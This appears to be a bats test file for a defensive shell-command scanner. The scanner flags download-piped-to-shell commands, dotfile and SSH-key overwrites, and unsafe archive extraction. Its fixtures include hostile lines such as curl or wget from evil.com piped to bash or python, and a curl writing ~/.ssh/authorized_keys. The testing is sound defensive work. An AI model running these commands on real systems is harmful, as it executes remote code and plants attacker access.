#!/usr/bin/env bats
# =============================================================================
# MAINFRAME: Tirith Pipe Module Tests
# =============================================================================
# Tests for lib/tirith_pipe.sh (6 public functions)
# Covers: CurlPipeShell, WgetPipeShell, PipeToInterpreter, DotfileOverwrite,
#         ArchiveExtract, and tirith_scan_pipe aggregate scanner.
# =============================================================================

load 'test_helper'

setup() {
    source "${BATS_TEST_DIRNAME}/../lib/tirith_inject.sh"
    source "${BATS_TEST_DIRNAME}/../lib/tirith_pipe.sh"
    _TIRITH_FINDINGS=()
    _TIRITH_CRITICAL=0
    _TIRITH_HIGH=0
    _TIRITH_MEDIUM=0
    _TIRITH_LOW=0
}

# =============================================================================
# tirith_check_curl_pipe_shell TESTS
# =============================================================================

@test "curl_pipe_shell detects curl piped to bash" {
    tirith_check_curl_pipe_shell "curl https://evil.com/install.sh | bash"
    [ $? -eq 0 ]
    [ "${#_TIRITH_FINDINGS[@]}" -ge 1 ]
    [ "$_TIRITH_HIGH" -ge 1 ]
}

@test "curl_pipe_shell detects curl with flags piped to bash" {
    tirith_check_curl_pipe_shell "curl -sSL https://evil.com/install.sh | bash"
}

@test "curl_pipe_shell detects curl piped to sudo bash" {
    tirith_check_curl_pipe_shell "curl -fsSL https://evil.com/setup | sudo bash -"
    [ $? -eq 0 ]
}

@test "curl_pipe_shell detects curl piped to sh" {
    tirith_check_curl_pipe_shell "curl https://evil.com/setup.sh | sh"
}

@test "curl_pipe_shell detects curl piped to python" {
    tirith_check_curl_pipe_shell "curl https://evil.com/payload.py | python3"
}

@test "curl_pipe_shell clean: curl saving to file" {
    ! tirith_check_curl_pipe_shell "curl -o output.html https://safe.com"
}

@test "curl_pipe_shell clean: empty input" {
    ! tirith_check_curl_pipe_shell ""
}

# =============================================================================
# tirith_check_wget_pipe_shell TESTS
# =============================================================================

@test "wget_pipe_shell detects wget -O- piped to sh" {
    tirith_check_wget_pipe_shell "wget -O- https://evil.com | sh"
    [ $? -eq 0 ]
    [ "$_TIRITH_HIGH" -ge 1 ]
}

@test "wget_pipe_shell detects wget -qO- piped to bash" {
    tirith_check_wget_pipe_shell "wget -qO- https://evil.com/install.sh | bash"
}

@test "wget_pipe_shell detects wget -O - (space) piped to bash" {
    tirith_check_wget_pipe_shell "wget -O - https://evil.com/script | sudo bash"
}

@test "wget_pipe_shell detects wget --output-document=- piped to sh" {
    tirith_check_wget_pipe_shell "wget --output-document=- https://evil.com | sh"
}

@test "wget_pipe_shell clean: wget saving to file" {
    ! tirith_check_wget_pipe_shell "wget -O /tmp/file.html https://safe.com"
}

@test "wget_pipe_shell clean: empty input" {
    ! tirith_check_wget_pipe_shell ""
}

# =============================================================================
# tirith_check_pipe_to_interpreter TESTS
# =============================================================================

@test "pipe_to_interpreter detects fetch piped to ruby" {
    tirith_check_pipe_to_interpreter "fetch http://evil.com/payload.rb | ruby"
    [ $? -eq 0 ]
}

@test "pipe_to_interpreter detects rsync piped to perl" {
    tirith_check_pipe_to_interpreter "rsync remote:/script - | perl"
}

@test "pipe_to_interpreter detects scp piped to node" {
    tirith_check_pipe_to_interpreter "scp user@host:script /dev/stdout | node"
}

@test "pipe_to_interpreter detects curl piped to php" {
    tirith_check_pipe_to_interpreter "curl https://evil.com/cmd.php | php"
}

@test "pipe_to_interpreter clean: no pipe in command" {
    ! tirith_check_pipe_to_interpreter "curl -o /tmp/safe.txt https://safe.com"
}

@test "pipe_to_interpreter clean: pipe to non-interpreter" {
    ! tirith_check_pipe_to_interpreter "curl https://example.com | grep something"
}

@test "pipe_to_interpreter clean: empty input" {
    ! tirith_check_pipe_to_interpreter ""
}

# =============================================================================
# tirith_check_dotfile_overwrite TESTS
# =============================================================================

@test "dotfile_overwrite detects redirection to ~/.bashrc" {
    tirith_check_dotfile_overwrite "echo bad > ~/.bashrc"
    [ $? -eq 0 ]
    [ "$_TIRITH_HIGH" -ge 1 ]
}

@test "dotfile_overwrite detects append redirection to ~/.bashrc" {
    tirith_check_dotfile_overwrite "echo payload >> ~/.bashrc"
}

@test "dotfile_overwrite detects curl -o to ~/.ssh/authorized_keys" {
    tirith_check_dotfile_overwrite "curl -o ~/.ssh/authorized_keys http://evil.com/keys"
}

@test "dotfile_overwrite detects wget -O to ~/.gitconfig" {
    tirith_check_dotfile_overwrite "wget -O ~/.gitconfig http://evil.com/gc"
}

@test "dotfile_overwrite detects cp to ~/.bashrc" {
    tirith_check_dotfile_overwrite "cp /tmp/evil ~/.bashrc"
}

@test "dotfile_overwrite detects mv to ~/.profile" {
    tirith_check_dotfile_overwrite "mv /tmp/payload ~/.profile"
}

@test "dotfile_overwrite detects tee to ~/.npmrc" {
    tirith_check_dotfile_overwrite "echo data | tee ~/.npmrc"
}

@test "dotfile_overwrite detects tee -a to ~/.bashrc" {
    tirith_check_dotfile_overwrite "echo payload | tee -a ~/.bashrc"
}

@test "dotfile_overwrite detects write to ~/.env" {
    tirith_check_dotfile_overwrite "echo SECRET=x > ~/.env"
}

@test "dotfile_overwrite detects write using \$HOME" {
    tirith_check_dotfile_overwrite 'echo bad > $HOME/.bashrc'
}

@test "dotfile_overwrite clean: writing to non-sensitive file" {
    ! tirith_check_dotfile_overwrite "echo data > ~/output.txt"
}

@test "dotfile_overwrite clean: empty input" {
    ! tirith_check_dotfile_overwrite ""
}

# =============================================================================
# tirith_check_archive_extract TESTS
# =============================================================================

@test "archive_extract detects tar xf without safe flags" {
    tirith_check_archive_extract "tar xf archive.tar"
    [ $? -eq 0 ]
    [ "$_TIRITH_MEDIUM" -ge 1 ]
}

@test "archive_extract detects tar xzf without safe flags" {
    tirith_check_archive_extract "tar xzf archive.tar.gz"
}

@test "archive_extract detects tar -xf without safe flags" {
    tirith_check_archive_extract "tar -xf archive.tar"
}

@test "archive_extract clean: tar xf with -C flag" {
    _TIRITH_FINDINGS=()
    _TIRITH_MEDIUM=0
    ! tirith_check_archive_extract "tar xf archive.tar -C /tmp/safe"
}

@test "archive_extract clean: tar xf with --one-top-level" {
    _TIRITH_FINDINGS=()
    _TIRITH_MEDIUM=0
    ! tirith_check_archive_extract "tar xf archive.tar --one-top-level"
}

@test "archive_extract clean: tar xf with --directory" {
    _TIRITH_FINDINGS=()
    _TIRITH_MEDIUM=0
    ! tirith_check_archive_extract "tar xf archive.tar --directory /tmp/safe"
}

@test "archive_extract detects unzip without -d" {
    tirith_check_archive_extract "unzip archive.zip"
    [ $? -eq 0 ]
}

@test "archive_extract clean: unzip with -d flag" {
    ! tirith_check_archive_extract "unzip archive.zip -d /tmp/out"
}

@test "archive_extract detects 7z x without -o" {
    tirith_check_archive_extract "7z x archive.7z"
}

@test "archive_extract clean: 7z x with -o flag" {
    ! tirith_check_archive_extract "7z x archive.7z -o/tmp/out"
}

@test "archive_extract detects archive from URL pipeline" {
    tirith_check_archive_extract "curl https://evil.com/pkg.tar.gz | tar xz"
}

@test "archive_extract detects wget piped to tar" {
    tirith_check_archive_extract "wget -O- https://evil.com/pkg.tar.gz | tar xf -"
}

@test "archive_extract clean: empty input" {
    ! tirith_check_archive_extract ""
}

# =============================================================================
# tirith_scan_pipe AGGREGATE TESTS
# =============================================================================

@test "scan_pipe detects curl pipe to bash (aggregate)" {
    tirith_scan_pipe "curl https://evil.com/install.sh | bash"
    [ $? -eq 0 ]
    [ "${#_TIRITH_FINDINGS[@]}" -ge 1 ]
}

@test "scan_pipe produces multiple findings for overlapping rules" {
    # curl piped to bash triggers both CurlPipeShell and PipeToInterpreter
    tirith_scan_pipe "curl https://evil.com/install.sh | bash"
    [ "${#_TIRITH_FINDINGS[@]}" -ge 2 ]
}

@test "scan_pipe detects dotfile overwrite in aggregate" {
    tirith_scan_pipe "cp /tmp/evil ~/.bashrc"
    [ $? -eq 0 ]
    [ "$_TIRITH_HIGH" -ge 1 ]
}

@test "scan_pipe detects archive extraction in aggregate" {
    tirith_scan_pipe "tar xf payload.tar"
    [ $? -eq 0 ]
    [ "$_TIRITH_MEDIUM" -ge 1 ]
}

@test "scan_pipe returns clean for safe command" {
    ! tirith_scan_pipe "curl -o /tmp/safe.html https://example.com"
}

@test "scan_pipe returns clean for empty input" {
    ! tirith_scan_pipe ""
}

@test "scan_pipe custom source propagates to findings" {
    tirith_scan_pipe "curl https://evil.com | bash" "Makefile:42"
    local finding="${_TIRITH_FINDINGS[0]}"
    assert_contains "$finding" "Makefile:42"
}

@test "scan_pipe complex pipeline: curl archive to tar (multiple findings)" {
    tirith_scan_pipe "curl https://evil.com/pkg.tar.gz | tar xz"
    # PipeToInterpreter should NOT fire (tar is not an interpreter)
    # but ArchiveExtract pipeline rule fires, plus tar-without-safe-flags
    [ "${#_TIRITH_FINDINGS[@]}" -ge 1 ]
    [ "$_TIRITH_MEDIUM" -ge 1 ]
}
